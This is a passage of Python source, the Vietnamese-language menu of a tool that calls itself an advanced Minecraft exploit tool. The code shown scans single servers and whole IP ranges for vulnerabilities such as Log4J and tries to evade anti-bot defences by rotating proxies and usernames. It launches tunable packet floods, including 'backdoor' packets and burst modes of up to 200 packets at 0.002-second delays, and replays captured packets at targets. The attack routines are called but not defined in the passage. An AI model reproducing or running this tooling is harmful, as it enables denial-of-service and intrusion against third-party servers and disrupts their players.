            print(f"{Colors.INFO}{Icons.BULLET} Công cụ khai thác Minecraft nâng cao")
            print(f"{Icons.BULLET} Hỗ trợ: Chat, Plugin, KeepAlive, Custom, Backdoor")
            print(f"{Icons.BULLET} Tính năng: Auto auth, quét IP range, chống anti-bot cải tiến, replay packets")
            print(f"{Icons.BULLET} Giao diện: Bảng điều khiển thời gian thực, xuất báo cáo JSON/CSV{Colors.ENDC}")
            input(f"\n{Colors.BOLD}{Icons.ARROW} Nhấn Enter để tiếp tục{Colors.ENDC}")
        elif choice == "2":
            clear_screen()
            print(f"{Colors.OKGREEN}Hướng dẫn sử dụng:{Colors.ENDC}")
            print(f"{Icons.BULLET} Nhập IP:port hoặc dải IP (VD: 192.168.1.0/24)")
            print(f"{Icons.BULLET} Chọn chế độ tấn công hoặc quét server")
            print(f"{Icons.BULLET} Quét: Ping, Players, Version, Lỗ hổng (Log4J, Plugin)")
            print(f"{Icons.BULLET} Chống anti-bot: Điều chỉnh tốc độ, xoay proxy, xoay username, đợi nếu yêu cầu")
            print(f"{Icons.BULLET} Replay: Gửi lại các packet thành công")
            print(f"{Colors.WARNING}{Icons.WARNING} Sử dụng hợp pháp!{Colors.ENDC}")
            input(f"\n{Colors.BOLD}{Icons.ARROW} Nhấn Enter để tiếp tục{Colors.ENDC}")
        elif choice == "3":
            clear_screen()
            config = reset_config()
            print(f"{Colors.OKGREEN}{Icons.CHECK} Đã reset config!{Colors.ENDC}")
            input(f"\n{Colors.BOLD}{Icons.ARROW} Nhấn Enter để tiếp tục{Colors.ENDC}")
        elif choice == "4":
            clear_screen()
            servers_input = input(f"{Colors.BOLD}{Icons.ARROW} IP:Port (Enter = {config['ip']}:{config['port']}): {Colors.ENDC}").strip() or f"{config['ip']}:{config['port']}"
            servers = []
            stop_event = threading.Event()
            spinner_task = asyncio.create_task(spinner_animation("Đang quét server...", stop_event))
            try:
                for server in servers_input.split(','):
                    try:
                        ip_port = server.strip().split(':')
                        ip = ip_port[0].strip()
                        port = int(ip_port[1]) if len(ip_port) > 1 and ip_port[1].strip().isdigit() else 25565
                        server_status = check_server(ip, port, timeout=config['timeout'])
                        if not server_status["status"]:
                            print(f"{Colors.FAIL}{Icons.CROSS} {ip}:{port} Lỗi: {server_status['error']}{Colors.ENDC}")
                            continue
                        vuln_test = test_vulnerability(ip, port, timeout=config['timeout'])
                        server_status["vulnerabilities"].append(vuln_test["result"])
                        servers.append((ip, port, server_status))
                    except ValueError:
                        print(f"{Colors.FAIL}{Icons.CROSS} Định dạng IP:Port không hợp lệ: {server}{Colors.ENDC}")
            finally:
                stop_event.set()
                await spinner_task
            display_scan_results(servers)
            input(f"\n{Colors.BOLD}{Icons.ARROW} Nhấn Enter để tiếp tục{Colors.ENDC}")
        elif choice == "5":
            clear_screen()
            ip_range = input(f"{Colors.BOLD}{Icons.ARROW} Dải IP (VD: 192.168.1.0/24): {Colors.ENDC}").strip()
            port = input(f"{Colors.BOLD}{Icons.ARROW} Port (Enter = 25565): {Colors.ENDC}").strip() or "25565"
            try:
                port = int(port)
                stop_event = threading.Event()
                spinner_task = asyncio.create_task(spinner_animation(f"Đang quét {ip_range}...", stop_event))
                servers = await scan_ip_range(ip_range, port, timeout=config['timeout'])
                stop_event.set()
                await spinner_task
                display_scan_results(servers)
            except ValueError:
                print(f"{Colors.FAIL}{Icons.CROSS} Port không hợp lệ!{Colors.ENDC}")
            input(f"\n{Colors.BOLD}{Icons.ARROW} Nhấn Enter để tiếp tục{Colors.ENDC}")
        elif choice == "6":
            clear_screen()
            success_count = {'chat': 0, 'plugin': 0, 'keepalive': 0, 'custom': 0, 'backdoor': 0}
            fail_count = {'chat': 0, 'plugin': 0, 'keepalive': 0, 'custom': 0, 'backdoor': 0}
            attack_modes = {
                "1": {"packets": 5, "rate_limit": 0.1, "burst": False, "name": "Nhẹ"},
                "2": {"packets": 10, "rate_limit": 0.05, "burst": False, "name": "Trung bình"},
                "3": {"packets": 20, "rate_limit": 0.02, "burst": False, "name": "Nặng"},
                "4": {"packets": 50, "rate_limit": 0.01, "burst": True, "name": "Burst"},
                "5": {"packets": 200, "rate_limit": 0.002, "burst": True, "name": "Siêu nặng"}
            }
            print(f"{Colors.BOLD}Chọn chế độ tấn công:{Colors.ENDC}")
            for k, v in attack_modes.items():
                print(f"{Colors.OKGREEN}{k}. {v['name']} ({v['packets']} pkt, {v['rate_limit']}s){Colors.ENDC}")
            mode = input(f"{Colors.BOLD}{Icons.ARROW} Chọn (1-5, Enter=tùy chỉnh): {Colors.ENDC}").strip()

            packets = config['packets_per_round']
            rate_limit = config['rate_limit']
            max_retries = config['max_retries']
            retry_delay = config['retry_delay']
            burst_mode = False
            duration = 0
            servers_input = f"{config['ip']}:{config['port']}"

            if mode in attack_modes:
                packets = attack_modes[mode]["packets"]
                rate_limit = attack_modes[mode]["rate_limit"]
                burst_mode = attack_modes[mode]["burst"]
            else:
                print(f"{Colors.INFO}Cấu hình hiện tại: {config['ip']}:{config['port']}{Colors.ENDC}")
                use_default = input(f"{Colors.BOLD}{Icons.ARROW} Dùng mặc định? (y/n): {Colors.ENDC}").strip().lower()
                if use_default != 'y':
                    servers_input = input(f"{Colors.BOLD}{Icons.ARROW} IP:Port: {Colors.ENDC}").strip() or f"{config['ip']}:{config['port']}"
                    auto_tune = input(f"{Colors.BOLD}{Icons.ARROW} Tự động tối ưu? (y/n): {Colors.ENDC}").strip().lower() == 'y'
                    if auto_tune:
                        ip, port = servers_input.split(',')[0].split(':')[0], int(servers_input.split(',')[0].split(':')[1]) if ':' in servers_input.split(',')[0] else 25565
                        server_status = check_server(ip, port, timeout=config['timeout'])
                        if server_status["status"]:
                            tuned_config = auto_tune_config(server_status)
                            packets = tuned_config["packets_per_round"]
                            rate_limit = tuned_config["rate_limit"]
                            burst_mode = tuned_config["burst_mode"]
                        else:
                            print(f"{Colors.WARNING}{Icons.WARNING} Không thể tối ưu do lỗi server, dùng mặc định{Colors.ENDC}")
                    else:
                        try:
                            packets = int(input(f"{Colors.BOLD}{Icons.ARROW} Số packet ({config['packets_per_round']}): {Colors.ENDC}").strip() or config['packets_per_round'])
                            rate_limit = float(input(f"{Colors.BOLD}{Icons.ARROW} Delay ({config['rate_limit']}): {Colors.ENDC}").strip() or config['rate_limit'])
                            max_retries = int(input(f"{Colors.BOLD}{Icons.ARROW} Số lần thử lại ({config['max_retries']}): {Colors.ENDC}").strip() or config['max_retries'])
                            retry_delay = float(input(f"{Colors.BOLD}{Icons.ARROW} Delay thử lại ({config['retry_delay']}): {Colors.ENDC}").strip() or config['retry_delay'])
                            burst_mode_input = input(f"{Colors.BOLD}{Icons.ARROW} Chế độ burst (y/n, Enter=n): {Colors.ENDC}").strip().lower()
                            burst_mode = burst_mode_input == 'y'
                        except ValueError:
                            print(f"{Colors.FAIL}{Icons.CROSS} Định dạng không hợp lệ, dùng cấu hình mặc định{Colors.ENDC}")
                            packets = config['packets_per_round']
                            rate_limit = config['rate_limit']
                            max_retries = config['max_retries']
                            retry_delay = config['retry_delay']
                            burst_mode = False
                    config.update({
                        "ip": servers_input.split(',')[0].split(':')[0],
                        "port": int(servers_input.split(',')[0].split(':')[1]) if ':' in servers_input.split(',')[0] else 25565,
                        "rate_limit": rate_limit,
                        "packets_per_round": packets,
                        "max_retries": max_retries,
                        "retry_delay": retry_delay
                    })
                    save_config(config)
                try:
                    duration = int(input(f"{Colors.BOLD}{Icons.ARROW} Thời gian (0=không giới hạn): {Colors.ENDC}").strip() or "0")
                except ValueError:
                    duration = 0
                    print(f"{Colors.WARNING}{Icons.WARNING} Thời gian không hợp lệ, dùng 0{Colors.ENDC}")

            servers = []
            for server in servers_input.split(','):
                try:
                    ip_port = server.strip().split(':')
                    ip = ip_port[0].strip()
                    port = int(ip_port[1]) if len(ip_port) > 1 and ip_port[1].strip().isdigit() else 25565
                    server_status = check_server(ip, port, timeout=config['timeout'])
                    if not server_status["status"]:
                        print(f"{Colors.FAIL}{Icons.CROSS} {ip}:{port} Lỗi: {server_status['error']}{Colors.ENDC}")
                        continue
                    anti_bot_check = test_vulnerability(ip, port, timeout=config['timeout'])
                    if anti_bot_check["status"] and "wait_time" in anti_bot_check:
                        print(f"{Colors.WARNING}{Icons.WARNING} {ip}:{port} Có anti-bot mạnh, bỏ qua{Colors.ENDC}")
                        log_message(f"Strong anti-bot detected at {ip}:{port}, skipping", "WARNING")
                        continue
                    print(f"{Colors.OKGREEN}{Icons.CHECK} {ip}:{port} Độ trễ: {server_status['avg_latency']:.0f}ms Người chơi: {server_status['player_count']}/{server_status['max_players']} Phiên bản: {server_status['version']}{Colors.ENDC}")
                    if server_status["vulnerabilities"]:
                        print(f"{Colors.WARNING}{Icons.WARNING} Lỗ hổng: {', '.join(server_status['vulnerabilities'])}{Colors.ENDC}")
                    servers.append((ip, port))
                except ValueError:
                    print(f"{Colors.FAIL}{Icons.CROSS} Định dạng IP:Port không hợp lệ: {server}{Colors.ENDC}")

            if not servers:
                print(f"{Colors.FAIL}{Icons.CROSS} Không có server hợp lệ!{Colors.ENDC}")
                input(f"\n{Colors.BOLD}{Icons.ARROW} Nhấn Enter để tiếp tục{Colors.ENDC}")
                continue

            packet_types_input = input(f"{Colors.BOLD}{Icons.ARROW} Loại packet (chat,plug,keep,cust,back, Enter=tất cả): {Colors.ENDC}").strip().lower()
            packet_types = ["chat", "plugin", "keepalive", "custom", "backdoor"] if not packet_types_input else packet_types_input.split(',')
            packet_types = [pt.strip() for pt in packet_types if pt.strip() in ["chat", "plugin", "keepalive", "custom", "backdoor"]]
            if not packet_types:
                print(f"{Colors.WARNING}{Icons.WARNING} Chọn tất cả loại packet{Colors.ENDC}")
                packet_types = ["chat", "plugin", "keepalive", "custom", "backdoor"]

            weights = {}
            if len(packet_types) > 1:
                print(f"{Colors.BOLD}Trọng số (1-10):{Colors.ENDC}")
                for pt in packet_types:
                    try:
                        weight = int(input(f"{Colors.BOLD}{Icons.ARROW} {pt[:4]}: {Colors.ENDC}").strip() or "1")
                        weights[pt] = max(1, min(10, weight))
                    except ValueError:
                        weights[pt] = 1
                        print(f"{Colors.WARNING}{Icons.WARNING} Trọng số không hợp lệ cho {pt}, dùng 1{Colors.ENDC}")

            try:
                custom_packet_size = int(input(f"{Colors.BOLD}{Icons.ARROW} Kích thước packet (10-50): {Colors.ENDC}").strip() or "20")
                custom_packet_size = max(10, min(50, custom_packet_size))
            except ValueError:
                custom_packet_size = 20
                print(f"{Colors.WARNING}{Icons.WARNING} Kích thước không hợp lệ, dùng 20{Colors.ENDC}")

            print(f"{Colors.WARNING}{Icons.WARNING} Đang tấn công {', '.join(f'{ip}:{port}' for ip, port in servers)} (Chế độ: {attack_modes.get(mode, {'name': 'Tùy chỉnh'})['name']})...{Colors.ENDC}")
            log_message(f"Tấn công {', '.join(f'{ip}:{port}' for ip, port in servers)} - Chế độ: {attack_modes.get(mode, {'name': 'Tùy chỉnh'})['name']}, Packet: {packets}, Thời gian: {duration}s, Delay: {rate_limit}s, Loại: {packet_types}, Trọng số: {weights}, Kích thước: {custom_packet_size}, Burst: {burst_mode}, Thử lại: {max_retries}, Delay thử lại: {retry_delay}", "INFO")
            await start_attack(servers, packets, duration, rate_limit, packet_types, weights, custom_packet_size, burst_mode, max_retries, retry_delay)
        elif choice == "7":
            clear_screen()
            if not packet_log:
                print(f"{Colors.FAIL}{Icons.CROSS} Không có packet để replay!{Colors.ENDC}")
            else:
                print(f"{Colors.INFO}Danh sách packet đã gửi:{Colors.ENDC}")
                for pkt in packet_log[:10]:
                    print(f"{Colors.INFO}{Icons.BULLET} ID: {pkt['id']}, Time: {pkt['time']}{Colors.ENDC}")
                packet_ids = input(f"{Colors.BOLD}{Icons.ARROW} Nhập ID packet (dùng dấu phẩy): {Colors.ENDC}").strip()
                try:
                    packet_ids = [int(pid.strip()) for pid in packet_ids.split(',') if pid.strip().isdigit()]
                    ip_port = input(f"{Colors.BOLD}{Icons.ARROW} IP:Port (Enter = {config['ip']}:{config['port']}): {Colors.ENDC}").strip() or f"{config['ip']}:{config['port']}"
                    ip, port = ip_port.split(':')[0], int(ip_port.split(':')[1]) if ':' in ip_port else 25565
                    replay_packets(ip, port, packet_ids, timeout=config['timeout'])
                except ValueError:
                    print(f"{Colors.FAIL}{Icons.CROSS} Định dạng không hợp lệ!{Colors.ENDC}")
            input(f"\n{Colors.BOLD}{Icons.ARROW} Nhấn Enter để tiếp tục{Colors.ENDC}")
        elif choice == "0":
            print(f"{Colors.OKBLUE}{Icons.STAR} Thoát chương trình{Colors.ENDC}")
            break

if __name__ == "__main__":
    try:
        asyncio.run(show_menu())
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}{Icons.WARNING} Chương trình đã dừng bởi người dùng!{Colors.ENDC}")
        log_message("Program stopped by user", "INFO")
        connection_pool.cleanup()
        sys.exit(0)